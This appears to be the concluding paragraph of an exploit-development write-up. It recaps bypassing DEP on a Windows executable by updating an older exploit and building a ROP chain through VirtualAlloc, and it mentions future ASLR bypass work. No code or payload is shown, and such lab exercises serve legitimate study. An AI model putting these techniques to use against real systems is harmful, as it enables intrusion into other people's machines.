During this exercise we bypassed DEP restrictions on an executable. We leveraged information from an older debunked exploit and patched it so that it will work on modern operating systems. One thing to note is that the exploit is still somewhat OS dependent as the IAT offsets will change from Windows version to version. Regardless, this was fun exercise to get comfortable with building a functional ROP chain using `VirtualAlloc`. Maybe in the next iteration we will explore the possibility of bypassing ASLR and using a different Windows API such as `WriteProcessMemory`. If you notice any errors or inconsistencies please reach out!
